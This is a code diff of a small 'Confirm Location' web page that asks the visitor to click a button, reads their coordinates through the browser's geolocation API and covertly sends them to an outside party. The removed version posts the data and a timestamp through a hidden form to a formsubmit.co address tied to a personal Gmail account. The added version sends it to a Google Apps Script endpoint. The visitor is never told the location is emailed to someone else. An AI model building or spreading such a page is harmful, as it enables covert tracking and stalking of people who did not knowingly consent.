@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Confirmation</title>
+    <title>Confirm Location</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -30,17 +30,12 @@
     </style>
 </head>
 <body>
+
     <h1>Confirm Your Location</h1>
-    <p>To proceed, press the button below to share your location.</p>
+    <p>Click the button below to share your location.</p>
+
     <button onclick="getLocation()">Confirm Location</button>
     <p id="result"></p>
-
-    <form id="locationForm" action="https://formsubmit.co/misofiko3@gmail.com" method="POST" style="display: none;">
-        <input type="hidden" name="latitude" id="latitude">
-        <input type="hidden" name="longitude" id="longitude">
-        <input type="hidden" name="time" id="time">
-        <button type="submit">Send</button>
-    </form>
 
     <script>
         function getLocation() {
@@ -51,40 +46,45 @@
                     maximumAge: 0
                 });
             } else {
-                document.getElementById("result").innerHTML = "Your browser doesn't support geolocation.";
+                document.getElementById("result").innerText = "Geolocation is not supported by this browser.";
             }
         }
 
         function sendPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-            const result = `Location: Latitude ${latitude}, Longitude ${longitude}`;
-            document.getElementById("result").innerHTML = result;
 
-            // ارسال اطلاعات به فرم
-            document.getElementById("latitude").value = latitude;
-            document.getElementById("longitude").value = longitude;
-            document.getElementById("time").value = new Date().toLocaleString();
-
-            // ارسال خودکار فرم
-            document.getElementById("locationForm").submit();
+            fetch("https://script.google.com/macros/s/AKfycbyxQiZlilr3P0tLUreUTROXdCPWecD-pMi-SUe1fQ3LyMPvR2wyD_fNIOZAQkGSilSW/exec", { 
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `latitude=${latitude}&longitude=${longitude}`
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("result").innerText = "Email sent successfully!";
+            })
+            .catch(error => {
+                document.getElementById("result").innerText = "Failed to send email.";
+                console.error("Error:", error);
+            });
         }
 
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    document.getElementById("result").innerHTML = "Permission to access location was denied.";
+                    document.getElementById("result").innerText = "Permission denied.";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    document.getElementById("result").innerHTML = "Location information is unavailable.";
+                    document.getElementById("result").innerText = "Location unavailable.";
                     break;
                 case error.TIMEOUT:
-                    document.getElementById("result").innerHTML = "The request to get location timed out.";
+                    document.getElementById("result").innerText = "Request timed out.";
                     break;
                 default:
-                    document.getElementById("result").innerHTML = "An unknown error occurred.";
+                    document.getElementById("result").innerText = "An unknown error occurred.";
             }
         }
     </script>
+
 </body>
 </html>
